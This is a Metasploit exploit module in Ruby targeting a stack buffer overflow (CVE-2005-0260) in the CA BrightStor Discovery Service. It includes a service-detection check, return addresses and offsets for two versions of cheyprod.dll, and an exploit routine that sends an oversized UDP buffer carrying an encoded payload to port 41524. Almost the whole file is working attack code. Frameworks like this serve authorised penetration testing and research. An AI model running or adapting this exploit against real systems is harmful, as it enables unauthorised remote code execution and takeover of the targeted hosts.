##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CA BrightStor Discovery Service Stack Buffer Overflow',
      'Description'    => %q{
          This module exploits a vulnerability in the CA BrightStor
        Discovery Service. This vulnerability occurs when a large
        request is sent to UDP port 41524, triggering a stack buffer
        overflow.
      },
      'Author'         => [ 'hdm', 'patrick' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2005-0260'],
          [ 'OSVDB', '13613'],
          [ 'BID', '12491'],
          [ 'URL', 'http://www.idefense.com/application/poi/display?id=194&type=vulnerabilities'],
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'Space'    => 2048,
          'BadChars' => "\x00",
          'StackAdjustment' => -3500,
        },
      'Platform'      => %w{ win },
      'Targets'        =>
        [
          [
            'cheyprod.dll 12/12/2003',
            {
              'Platform' => 'win',
              'Ret'      => 0x23808eb0, # call to edi reg
              'Offset'   => 968,
            },
          ],
          [
            'cheyprod.dll 07/21/2004',
            {
              'Platform' => 'win',
              'Ret'      => 0x2380a908, # call edi
              'Offset'   => 970,
            },
          ],
        ],
      'DisclosureDate' => 'Dec 20 2004',
      'DefaultTarget' => 0))

    register_options(
      [
        Opt::RPORT(41524)
      ], self.class)
  end

  def check

    # The first request should have no reply
    csock = Rex::Socket::Tcp.create(
      'PeerHost'  => datastore['RHOST'],
      'PeerPort'  => 41523,
      'Context'   =>
        {
          'Msf'        => framework,
          'MsfExploit' => self,
        })

    csock.put('META')
    x = csock.get_once(-1, 3)
    csock.close

    # The second request should be replied with the host name
    csock = Rex::Socket::Tcp.create(
      'PeerHost'  => datastore['RHOST'],
      'PeerPort'  => 41523,
      'Context'   =>
        {
          'Msf'        => framework,
          'MsfExploit' => self,
        })

    csock.put('hMETA')
    y = csock.get_once(-1, 3)
    csock.close

    if (y and not x)
      return Exploit::CheckCode::Detected
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    connect_udp

    print_status("Trying target #{target.name}...")

    buf = rand_text_english(4096)

    # Target 0:
    #
    # esp @ 971
    # ret @ 968
    # edi @ 1046
    # end = 4092

    buf[target['Offset'], 4] = [ target.ret ].pack('V')
    buf[1046, payload.encoded.length] = payload.encoded

    udp_sock.put(buf)
    udp_sock.recvfrom(8192)

    handler
    disconnect_udp
  end

end